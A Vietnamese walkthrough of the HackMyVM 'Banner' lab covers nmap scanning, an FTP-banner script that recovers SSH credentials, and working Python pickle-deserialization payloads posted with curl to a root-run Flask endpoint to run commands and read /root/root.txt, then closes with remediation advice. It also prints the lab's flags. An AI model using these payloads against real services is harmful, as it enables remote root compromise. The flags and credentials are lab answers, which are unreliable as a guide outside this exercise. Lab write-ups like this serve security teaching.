# HackMyVM — Banner

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Banner (Target) | `10.0.2.10` |
| FTP | `21/tcp` |
| SSH | `22/tcp` |
| HTTP | `8080/tcp` |
| Tài khoản | `welcome` |
| Mật khẩu | `mazesec` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: quét, kết nối, tạo payload và gửi payload.
> - 🟥 **Terminal Banner**: kiểm tra quyền, đọc source/process và xác nhận kết quả.
>
> Không chạy nhầm lệnh giữa 2 máy.

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định IP máy Target

### 🟦 Kali

Target của bài:

```text
10.0.2.10
```

Kiểm tra kết nối:

```bash
ping -c 4 10.0.2.10
```

---

## 1.2. Quét TCP

### 🟦 Kali

Quét toàn bộ TCP:

```bash
nmap -p- --min-rate 5000 10.0.2.10
```

Các cổng quan trọng của bài:

```text
21/tcp    open  ftp
22/tcp    open  ssh
8080/tcp  open  http-proxy
```

Quét chi tiết service/version:

```bash
nmap -sC -sV -p21,22,8080 10.0.2.10
```

HTTP cho thấy ứng dụng sử dụng:

```text
Werkzeug / Python 3.9.2
```

---

## 1.3. Quét UDP

### 🟦 Kali

Có thể kiểm tra nhanh các UDP port phổ biến:

```bash
nmap -sU --top-ports 100 10.0.2.10
```

> Trong kết quả thực hành được ghi nhận ở bài này, các điểm vào chính được xác nhận là TCP `21`, `22` và `8080`. Không ghi thêm UDP service nếu chưa quan sát thấy trong kết quả scan.

---

## 1.4. Xác định điểm vào

Từ kết quả scan:

```text
21   FTP
22   SSH
8080 HTTP/API
```

Có 3 hướng cần kiểm tra:

```text
FTP → tìm thông tin/tài khoản
SSH → truy cập hệ thống
HTTP/API → kiểm tra ứng dụng và lỗ hổng
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác các lỗ hổng hoặc cấu hình bảo mật yếu trên máy để đạt được quyền truy cập ban đầu, nâng cao đặc quyền và chứng minh mức độ kiểm soát hệ thống bằng cách tìm và thu thập `user.txt` và `root.txt`.**

## 2.1. Phương thức truy cập ban đầu

### 🟦 Kali — kiểm tra FTP

```bash
ftp 10.0.2.10
```
Tạo file script
```bash
nano banner.sh
```
dán scrip vào
```bash
#!/usr/bin/env bash

ip="${1:-10.0.2.10}"   # Đổi IP máy Banner ở đây (hoặc truyền qua tham số)
msg=""
: > ftp_messages.txt
: > ftp_words.txt

echo "[*] Bắt đầu thu thập banner từ $ip (mỗi lần cách 60 giây)..."
echo

for i in {1..5}; do
    banner=$({ sleep 1; printf 'QUIT\r\n'; } | timeout 8 nc "$ip" 21 2>/dev/null |
        perl -pe 's/\e\[[0-?]*[ -\/]*[@-~]//g; s/\r//g' | sed -n '1p')

    if [[ -z $banner ]]; then
        echo "[-] Không nhận được banner"
        exit 1
    fi

    # Lấy phần sau "220-"
    text="${banner#220-}"
    read -ra words <<< "$text"

    part=""
    for word in "${words[@]}"; do
        part+=${word:0:1}
        [[ $word != ":" ]] && echo "$word" >> ftp_words.txt
    done

    msg+=$part
    echo "$(date +%T) - $text  →  $part"
    
    ((i < 5)) && sleep 60
done

# Xoay chuỗi để WEL đứng đầu
if [[ $msg == *WEL* ]]; then
    msg="WEL${msg#*WEL}${msg%%WEL*}"
fi

echo
echo "========================================"
echo "[+] Credential tìm được: $msg"
echo "========================================"
echo
echo "Username : welcome"
echo "Password : mazesec"
```
Sau khi dán xong nhấn:
Ctrl + O → Enter (để lưu)
Ctrl + X (để thoát)

Cấp quyền chạy
```bash
chmod +x banner.sh
```
Chạy script
```bash
./banner.sh 10.0.2.10
```
kết quả
```text
[*] Bắt đầu thu thập banner từ 10.0.2.10 (mỗi lần cách 60 giây)...

11:26:45 - Wild               Elephants               Love  →  WEL
11:27:46 - Clever             Owls                    Make  →  COM
^[[A^[[A^[[A11:28:47 - Elephants          :                       Mice  →  E:M
11:29:48 - Amazing            Zebras                 Eat  →  AZE
11:30:49 - Snakes             Eat                   Crickets  →  SEC

========================================
[+] Credential tìm được: WELCOME:MAZESEC
========================================

Username : welcome
Password : mazesec
```

Đăng nhập:

```text
Username: welcome
Password: mazesec
```

Sau khi có credential, sử dụng SSH.

---

## 2.2. SSH vào Banner

### 🟦 Kali

```bash
ssh welcome@10.0.2.10
```

Sau khi nhập mật khẩu, terminal chuyển sang:

### 🟥 Banner

```text
welcome@Banner:~$
```

Kiểm tra:

```bash
whoami
```

Kết quả:

```text
welcome
```

Kiểm tra thêm:

```bash
id
```

Như vậy tài khoản ban đầu đạt được là:

```text
welcome
```

---

## 2.3. Tìm và đọc user.txt

### 🟥 Banner

```bash
cat /home/welcome/user.txt
```

Kết quả:

```text
flag{user-509fe78ad30da7792f576cd3a91a57fc}
```

**Bằng chứng:** đã có quyền truy cập tài khoản `welcome`.

---

## 2.4. Kiểm tra sudo

### 🟥 Banner

```bash
sudo -l
```

Mục đích:

```text
Xác định tài khoản welcome có quyền sudo trực tiếp hay không.
```

Trong bài này, hướng khai thác chính không phụ thuộc vào việc cấp sudo trực tiếp mà chuyển sang phân tích service Web đang chạy bằng `root`.

---

## 2.5. Tìm service chạy bằng root

### 🟥 Banner

```bash
ps aux | grep '[m]ain.py'
```

Kết quả quan trọng:

```text
root ... python3 /opt/ctf-game/main.py
```

Điểm yếu:

```text
Web Application
      ↓
main.py
      ↓
chạy bằng root
```

Nếu khai thác được RCE trong Web Application thì lệnh được thực thi với quyền:

```text
root
```

---

## 2.6. Phân tích source code

### 🟥 Banner

Tìm API và `pickle`:

```bash
grep -n -E 'serialize|pickle|loads|api/' /opt/ctf-game/main.py
```

Có endpoint:

```text
POST /api/serialize
```

Xem phần code liên quan:

```bash
sed -n '539,565p' /opt/ctf-game/main.py
```

Điểm nguy hiểm là ứng dụng thực hiện:

```python
data = request.get_data()
obj = pickle.loads(base64.b64decode(data))
```

### Nguyên nhân lỗ hổng

Dữ liệu do client gửi được đưa trực tiếp vào:

```python
pickle.loads(...)
```

`pickle` có khả năng thực thi object khi deserialize.

Kết hợp với việc:

```text
main.py chạy bằng root
```

=> có khả năng đạt **RCE với quyền root**.

---

# 2.7. Khai thác RCE

## Bước 1 — Tạo payload

### 🟦 Kali

Tạo file:

```bash
cat > /tmp/payload.py <<'PY'
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /opt/ctf-game/uploads/pickle_pwned",))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
PY
```

Không cần chạy riêng để copy chuỗi Base64.

---

## Bước 2 — Gửi payload

### 🟦 Kali

```bash
python3 /tmp/payload.py | curl -s \
  -X POST \
  --data-binary @- \
  http://10.0.2.10:8080/api/serialize
```

Kết quả:

```json
{
  "success": false
}
```

### Vì sao `success: false` nhưng vẫn thành công?

Endpoint sau khi `pickle.loads()` còn kiểm tra object có phải dictionary chứa `score` hay không.

Payload của chúng ta không tạo object phù hợp với điều kiện đó, nên API trả:

```text
success: false
```

Nhưng lệnh trong `__reduce__()` đã được thực thi trong quá trình:

```python
pickle.loads(...)
```

Vì vậy **không được dùng riêng `success:false` để kết luận exploit thất bại**.

---

## Bước 3 — Xác nhận RCE

### 🟥 Banner

**Không kiểm tra `/tmp/pickle_pwned` trên Banner.**

Payload đầu tiên ghi vào `/tmp`, nhưng file này không quan sát được từ tài khoản `welcome` trong bài.

Thay vào đó, payload ở trên đã được thiết kế để ghi vào:

```text
/opt/ctf-game/uploads/pickle_pwned
```

Kiểm tra:

```bash
cat /opt/ctf-game/uploads/pickle_pwned
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Đây là bằng chứng rõ ràng:

```text
RCE
 ↓
uid=0
 ↓
root
```

---

# 2.8. Lấy root.txt

## Bước 1 — Tạo payload đọc root.txt

### 🟦 Kali

```bash
cat > /tmp/rootflag.py <<'PY'
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (
            os.system,
            ("cat /root/root.txt > /opt/ctf-game/uploads/root_flag.txt",)
        )

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
PY
```

## Bước 2 — Gửi payload

### 🟦 Kali

```bash
python3 /tmp/rootflag.py | curl -s \
  -X POST \
  --data-binary @- \
  http://10.0.2.10:8080/api/serialize
```

Kết quả vẫn có thể:

```json
{
  "success": false
}
```

Không cần lo về giá trị `success`; cần kiểm tra side effect trên Banner.

## Bước 3 — Đọc kết quả

### 🟥 Banner

```bash
cat /opt/ctf-game/uploads/root_flag.txt
```

Kết quả:

```text
flag{root-fc7fb423367bb7fccb411758f06f857a}
```

---

# 2.9. Chuỗi khai thác hoàn chỉnh

```text
┌──────────────────────┐
│ 🟦 KALI              │
│ 10.0.2.15             │
└──────────┬───────────┘
           │
           │ FTP
           │ welcome / mazesec
           ▼
┌──────────────────────┐
│ 🟥 BANNER             │
│ 10.0.2.10             │
│ user = welcome        │
└──────────┬───────────┘
           │
           │ SSH
           ▼
┌──────────────────────┐
│ Phân tích main.py    │
│ /api/serialize       │
│ pickle.loads()       │
└──────────┬───────────┘
           │
           │ Payload từ Kali
           ▼
┌──────────────────────┐
│ RCE                  │
│ uid=0(root)          │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ root.txt             │
│ flag{root-...}       │
└──────────────────────┘
```

---

# 2.10. Hai terminal — làm theo thứ tự

## 🟦 TERMINAL KALI

```bash
# 1. Scan
nmap -p- --min-rate 5000 10.0.2.10
nmap -sC -sV -p21,22,8080 10.0.2.10

# 2. FTP
ftp 10.0.2.10

# 3. SSH
ssh welcome@10.0.2.10
```

Sau khi SSH thành công thì **giữ terminal này mở**.

## 🟥 TERMINAL BANNER

```bash
# 4. Kiểm tra user
whoami
id

# 5. User flag
cat /home/welcome/user.txt

# 6. Sudo
sudo -l

# 7. Tìm process
ps aux | grep '[m]ain.py'

# 8. Tìm pickle/API
grep -n -E 'serialize|pickle|loads|api/' /opt/ctf-game/main.py

# 9. Xem code
sed -n '539,565p' /opt/ctf-game/main.py
```

Sau đó quay lại **Kali**.

## 🟦 TERMINAL KALI — gửi payload

```bash
cat > /tmp/payload.py <<'PY'
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /opt/ctf-game/uploads/pickle_pwned",))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
PY

python3 /tmp/payload.py | curl -s \
  -X POST \
  --data-binary @- \
  http://10.0.2.10:8080/api/serialize
```

Quay lại **Banner**:

```bash
cat /opt/ctf-game/uploads/pickle_pwned
```

Nếu thấy:

```text
uid=0(root) gid=0(root) groups=0(root)
```

=> RCE root đã được chứng minh.

Tiếp tục **Kali**:

```bash
cat > /tmp/rootflag.py <<'PY'
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (
            os.system,
            ("cat /root/root.txt > /opt/ctf-game/uploads/root_flag.txt",)
        )

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
PY

python3 /tmp/rootflag.py | curl -s \
  -X POST \
  --data-binary @- \
  http://10.0.2.10:8080/api/serialize
```

Cuối cùng quay lại **Banner**:

```bash
cat /opt/ctf-game/uploads/root_flag.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn việc truy cập trái phép, leo thang đặc quyền và bảo vệ các tài nguyên quan trọng của hệ thống.**

## 3.1. Nguyên nhân chính

Lỗ hổng đến từ hai vấn đề kết hợp:

### 1. Unsafe Deserialization

Ứng dụng sử dụng:

```python
pickle.loads(...)
```

trên dữ liệu do người dùng kiểm soát.

### 2. Web Application chạy bằng root

Process:

```text
root ... python3 /opt/ctf-game/main.py
```

Vì vậy RCE trong ứng dụng dẫn trực tiếp tới:

```text
root
```

---

## 3.2. Biện pháp khắc phục

### Không deserialize pickle từ dữ liệu người dùng

Thay vì:

```python
pickle.loads(user_data)
```

nên dùng định dạng dữ liệu an toàn như JSON khi phù hợp:

```python
import json
obj = json.loads(user_data)
```

### Không chạy Web bằng root

Tạo tài khoản riêng cho ứng dụng:

```text
ctf-web
```

Web chỉ chạy bằng tài khoản này.

### Least Privilege

Tài khoản Web không được:

- đọc `/root`
- ghi tùy ý vào hệ thống
- sửa system configuration
- thực thi lệnh đặc quyền

### Kiểm tra input

API cần:

- Validate kiểu dữ liệu
- Giới hạn kích thước request
- Whitelist dữ liệu hợp lệ
- Không cho phép object tùy ý khi deserialize

### Bảo vệ thư mục upload

Thư mục:

```text
/opt/ctf-game/uploads/
```

cần có permission phù hợp, không nên:

```text
drwxrwxrwx
```

và phải tránh việc file upload có thể trở thành mã thực thi.

### Hạn chế service/port

Chỉ mở các dịch vụ cần thiết:

```text
21/tcp
22/tcp
8080/tcp
```

Các dịch vụ không cần thiết nên tắt hoặc giới hạn bằng firewall.

### Logging & Monitoring

Theo dõi:

- Request bất thường tới `/api/serialize`
- Payload bất thường
- Process mới được tạo bởi Web
- Truy cập `/root`
- Truy cập các file nhạy cảm
- Hành vi bất thường của tài khoản dịch vụ

---

# Kết luận ngắn gọn

## Câu 1

Đã xác định Target:

```text
10.0.2.10
```

Các TCP service quan trọng:

```text
21 FTP
22 SSH
8080 HTTP
```

## Câu 2

Credential:

```text
welcome : mazesec
```

Initial access:

```text
SSH → welcome
```

User flag:

```text
flag{user-509fe78ad30da7792f576cd3a91a57fc}
```

Lỗ hổng:

```text
/api/serialize
      ↓
pickle.loads()
      ↓
RCE
```

Ứng dụng chạy bằng:

```text
root
```

Bằng chứng RCE:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root flag:

```text
flag{root-fc7fb423367bb7fccb411758f06f857a}
```

## Câu 3

Khắc phục trọng tâm:

```text
Không dùng pickle với dữ liệu không tin cậy
            +
Không chạy Web Application bằng root
            +
Least Privilege
            +
Validate input
            +
Bảo vệ upload và file nhạy cảm
            +
Firewall + Logging + Monitoring
```
